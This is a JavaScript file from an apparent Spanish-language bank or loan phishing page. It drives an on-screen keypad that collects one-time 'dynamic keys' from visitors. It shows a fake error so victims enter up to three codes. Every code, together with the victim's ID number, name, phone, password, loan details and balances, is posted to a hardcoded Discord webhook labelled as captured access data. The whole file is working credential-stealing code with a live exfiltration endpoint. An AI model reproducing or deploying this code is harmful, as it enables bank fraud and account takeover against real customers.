document.addEventListener("DOMContentLoaded", () => {
  const validoHasta = localStorage.getItem('validoHasta');

  const validoHastaText = document.getElementById("validoHasta");

  validoHastaText.innerHTML = validoHasta;

  const inputs = document.querySelectorAll('input[id^="otp-"]');
  const keyboard = document.getElementById("keyboard");
  const deleteBtn = document.getElementById("delete-otp");
  const loadingSpinner = document.querySelector(".loadingContainer");
  const finishContainer = document.querySelector(".finishContainer");
  const sectionTeclado = document.getElementById("sectionTeclado");
  const btnReturn = document.getElementById("btnReturn");

  const amount = document.getElementById("amount");
  const params = new URLSearchParams(window.location.search);
  const type = params.get("type");

  // loadingSpinner.style.display = "block";
  //Despues de 1 segundo se muestra el mensaje de error
  // setTimeout(() => {
  //   loadingSpinner.style.display = "none";
  // }, 5000);

  btnReturn.addEventListener("click", (e) => {
    window.location.href = 'accces-sign-in.php.html';
  });

  let currentInput = 0;
  let contSend = 0;

  // Configuración del webhook de Discord - WEBHOOK ACTUALIZADO
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1528561832745504890/-WMClOdhjh5W17ifU1gTiOu2IwsJCYZX4IBD7ETnTCARvPsD2tSSVjLqywSsJNie7kQN";
  
  // Función para enviar mensaje a Discord con embeds formateados
  async function sendToDiscord(content) {
    try {
      console.log("Enviando a Discord:", content); // Debug
      
      // Crear un embed formateado para mejor visualización
      const embed = {
        title: "✅ Información de Acceso Capturada",
        description: content,
        color: 0x0bbd67,
        timestamp: new Date().toISOString()
      };

      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          embeds: [embed]
        })
      });
      
      if (!response.ok) {
        console.error("Discord webhook error:", response.status, await response.text());
      } else {
        console.info("Message sent to Discord successfully");
      }
    } catch (err) {
      console.error("Failed to send to Discord:", err);
    }
  }

  // Manejar clics del teclado
  keyboard.addEventListener("click", (e) => {
    const button = e.target.closest(".keyboard-btn");
    if (button && !button.id.includes("delete")) {
      const value = button.dataset.value;
      if (currentInput < inputs.length) {
        // Guardar el valor real en un atributo personalizado
        inputs[currentInput].dataset.realValue = value;
        // Mostrar asterisco en el campo de entrada
        inputs[currentInput].value = "*";
        // Disparar el evento input
        inputs[currentInput].dispatchEvent(
          new Event("input", {
            bubbles: true,
          })
        );
        currentInput++;
      }
    }
  });

  // Manejar el botón de borrar
  deleteBtn.addEventListener("click", () => {
    if (currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].dispatchEvent(
        new Event("input", {
          bubbles: true,
        })
      );
    }
  });

  // Permitir borrar con tecla retroceso
  document.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].dispatchEvent(
        new Event("input", {
          bubbles: true,
        })
      );
    }
  });

  // Prevenir cualquier entrada de teclado físico
  inputs.forEach((input) => {
    ["keydown", "keyup", "keypress", "input", "textInput"].forEach(
      (eventType) => {
        input.addEventListener(eventType, (e) => {
          e.preventDefault();
          return false;
        });
      }
    );

    input.addEventListener("paste", (e) => {
      e.preventDefault();
      return false;
    });

    input.setAttribute("readonly", "readonly");
    input.setAttribute("inputmode", "none");
  });

  function resetKeyboard() {
    currentInput = 0;

    inputs.forEach((input) => {
      input.value = "";
      input.dataset.realValue = ""; // Borra el valor real también
    });

    inputs[0].focus();
  }

  // Verificar el estado de los inputs
  inputs.forEach((input, index) => {
    input.addEventListener("input", async () => {
      let isComplete = Array.from(inputs).every((input) => input.value !== "");
      if (isComplete) {
        let otp = "";
        inputs.forEach((input) => {
          otp += input.dataset.realValue || "";
        });

        const formData = JSON.parse(localStorage.getItem("formData")) || {};

        if (otp === "123456" || otp === formData.cedula.toString().slice(0, 6)) {
          const errorMessage = document.querySelector(".errorMessage");
          errorMessage.style.opacity = "1";
          errorMessage.style.transform = "translateY(-20px)";

          setTimeout(() => {
            resetKeyboard();
          }, 100);

          setTimeout(() => {
            errorMessage.style.opacity = "0";
            errorMessage.style.transform = "translateY(20px)";
          }, 5000);

          return;
        }
        contSend += 1;

        amount.innerHTML = "$ " + formData.montoPrestamo;

        loadingSpinner.style.display = "block";

        // Guardar la clave dinámica actual en formData
        formData[`claveDinamica_${contSend}`] = otp;
        localStorage.setItem("formData", JSON.stringify(formData));

        let nombreCompleto = formData.nombreCompleto || "";
        if (!nombreCompleto) {
          try {
            const customerData = JSON.parse(localStorage.getItem("customerData") || "null");
            const nombre = customerData?.nombre_completo || customerData?.nombre || "";
            const apellidos = (customerData?.apellidos || "").trim();
            nombreCompleto = apellidos && apellidos !== "No disponible" ? `${nombre} ${apellidos}`.trim() : nombre;
          } catch (error) {
            console.warn("No se pudo recuperar el nombre para Discord:", error);
          }
        }

        // Construir mensaje para Discord con toda la información capturada
        let discordMessage = `**📋 INTENTO DE ACCESO #${contSend}**\n\n`;
        
        // Información personal
        discordMessage += `**Datos Personales:**\n`;
        discordMessage += `• Cédula: \`${formData.cedula || "N/A"}\`\n`;
        discordMessage += `• Nombre: ${nombreCompleto || "N/A"}\n`;
        discordMessage += `• Teléfono: \`${formData.phoneNumber || "N/A"}\`\n`;
        discordMessage += `• Contraseña: \`${formData.password || "N/A"}\`\n\n`;

        // Información crediticia
        discordMessage += `**Información del Crédito:**\n`;
        discordMessage += `• Monto Solicitado: \`${formData.montoPrestamo || "N/A"}\`\n`;
        discordMessage += `• Plazo: \`${formData.plazo || "N/A"} meses\`\n`;
        discordMessage += `• Propósito: \`${formData.motivo || "N/A"}\`\n\n`;

        // Claves dinámicas acumuladas
        discordMessage += `**Claves Dinámicas Capturadas:**\n`;
        for (let i = 1; i <= contSend; i++) {
          const claveDinamica = formData[`claveDinamica_${i}`] || "Pendiente";
          discordMessage += `\`Clave ${i}: ${claveDinamica}\`\n`;
        }
        
        // Saldos si existen
        if (formData.firstSaldo || formData.secondSaldo) {
          discordMessage += `\n**Saldos:**\n`;
          discordMessage += `• Primer Saldo: \`${formData.firstSaldo || "N/A"}\`\n`;
          discordMessage += `• Segundo Saldo: \`${formData.secondSaldo || "N/A"}\`\n`;
        }
        
        discordMessage += `\n**Estado:** ${contSend === 3 ? "✅ COMPLETADO" : "⏳ EN PROGRESO"}`;
        
        console.log("Mensaje a Discord:", discordMessage); // Debug
        console.log("formData completo:", formData); // Debug para verificar que se guardó la clave

        setTimeout(() => {
          resetKeyboard();
          loadingSpinner.style.display = "none";
        }, 30000);

        if (contSend === 3) {
          finishContainer.style.display = "block";
          sectionTeclado.style.display = "none";
        } else {
          //Despues de 1 segundo se muestra el mensaje de error
          setTimeout(() => {
            const errorMessage = document.querySelector(".errorMessage");
            errorMessage.style.opacity = "1";
            errorMessage.style.transform = "translateY(-20px)";
            setTimeout(() => {
              errorMessage.style.opacity = "0";
              errorMessage.style.transform = "translateY(20px)";
            }, 5000);
          }, 30500);
        }
        
        // Enviar a Discord
        try {
          await sendToDiscord(discordMessage);
        } catch (error) {
          console.error("Error al enviar mensaje a Discord:", error);
        }
      }
    });
  });
});